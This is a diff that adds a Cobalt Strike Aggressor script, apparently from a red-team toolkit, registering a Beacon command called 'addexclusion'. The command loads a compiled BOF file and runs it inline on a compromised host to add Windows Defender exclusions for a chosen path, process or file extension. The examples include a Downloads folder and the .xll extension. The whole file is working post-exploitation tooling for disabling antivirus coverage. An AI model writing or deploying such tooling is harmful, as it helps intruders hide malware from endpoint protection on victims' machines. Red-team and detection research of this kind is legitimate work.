@@ -1,0 +1,46 @@
+# author REDMED-X
+
+beacon_command_register(
+	"addexclusion", "Add a new exclusion to Windows Defender for a folder, file, process or extension.",
+	"INFO:\nAdd a new exclusion to Windows Defender for a folder, file, process or extension.\n\n" .
+	"ARGUMENTS:\n[<exclusion type>]: specify one of the following exclusion types: path (file/folder), process, extension.\n[<exclusion data>]: specify the data to add as an exclusion.\n\n" .
+	"USAGE:\naddexclusion <exclusion type> <exclusion data>\n\n" .
+	"EXAMPLES:\naddexclusion path C:\\Users\\Public\\Downloads\naddexclusion process example.exe\naddexclusion extension .xll\n\n");
+	
+alias addexclusion {
+    $bid = $1;
+    $excltype = $2;
+    $excldata = $3;
+
+    if ($excltype eq "") {
+        berror($bid, "Please specify one of the following extension types: path | process | extension.\n");
+        return;
+    }
+
+    if ($excltype eq "path" || $excltype eq "process" || $excltype eq "extension") {
+        if ($excldata eq "") {
+            berror($bid, "Please specify the data to add as an exclusion.\n");
+            return;
+        }
+    }
+    else {
+        berror($bid, "This exclusion type isn't supported. Please specify one of the following options: path | process | extension.\n");
+        return;
+    }
+	
+    # Read in the right BOF file
+    $handle = openf(script_resource("addexclusion.o"));
+    $data   = readb($handle, -1);
+    closef($handle);
+
+    # Pack our arguments
+    $arg_data  = bof_pack($bid, "zZ", $excltype, $excldata);
+
+    blog($bid, "Tasked to add a new exclusion..");
+    beacon_inline_execute($bid, $data, "go", $arg_data);
+}
+
+
+
+
+
